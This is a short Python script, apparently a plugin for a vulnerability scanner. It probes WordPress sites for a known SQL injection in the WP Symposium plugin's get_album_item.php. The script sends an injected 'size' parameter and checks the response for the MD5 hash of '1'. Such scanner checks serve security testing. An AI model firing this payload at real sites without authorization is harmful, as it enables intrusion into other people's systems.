# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#__Author__ = buliuchang
# __refer__  = https://www.exploit-db.com/exploits/37244/

def assign(service, arg):
    if service == "wordpress":  
        return True, arg
    
def audit(arg):
    payload='wp-content/plugins/wp-symposium/get_album_item.php?size=md5(1);--'
    target=arg+payload
    code, head, res, ecode, redirect_url =curl.curl(target)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
       security_hole(target)
       
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://localhost/wordpress/')[1])
